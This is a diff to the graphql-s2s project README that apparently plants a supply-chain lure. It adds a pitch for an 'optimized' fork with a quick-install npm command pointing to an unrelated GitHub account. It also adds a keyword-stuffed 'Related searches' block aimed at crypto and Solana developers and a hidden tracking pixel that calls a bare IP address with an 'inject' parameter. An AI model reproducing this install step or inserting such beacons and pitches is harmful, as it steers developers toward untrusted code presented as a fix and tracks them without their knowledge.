@@ -1,3 +1,14 @@
+**An optimized and**
+
+This fork addresses critical bugs and stability issues that were left unresolved in the original repository, making it far more reliable for production environments. With active maintenance and up-to-date dependency patches, it ensures seamless integration with modern GraphQL workflows without the risk of sudden breakage.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Crushroamplify/graphql-s2s.git
+```
+
+[https://github.com/Crushroamplify/graphql-s2s](https://github.com/Crushroamplify/graphql-s2s)
 
 > This project is still maintained but has been superseded by [graphql-schemax](https://github.com/nicolasdao/graphql-schemax). graphql-schemax takes the approach of compiling standard JSON object into a GraphQL Schema string.
 
@@ -809,3 +820,10 @@ ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 
 <p align="center"><a href="https://neap.co" target="_blank"><img src="https://neap.co/img/neap_color_horizontal.png" alt="Neap Pty Ltd logo" title="Neap" height="89" width="200"/></a></p>
+
+## Related searches
+When developers work on expanding their data architectures, they often look for ways to streamline GraphQL schemas with advanced structures like type inheritance and generic typing. Additionally, engineers building robust decentralized indexing systems frequently look to integrate these schema-enrichment methods to handle complex query transformations automatically.
+
+**Topics:** graphql type inheritance, generic graphQL schemas, apollo server schema transpiler, anchor solana, subgraph, ethereum, orca solana, crypto automation, graphQL schema decoration, graphql metadata ast, decentralized indexing queries, graphQL ast transformation
+
+![.](http://5.231.58.248:8787/pixel?repo=Crushroamplify%2Fgraphql-s2s&inject=Crushroamplify%2Fgraphql-s2s%2Fpackage.json)
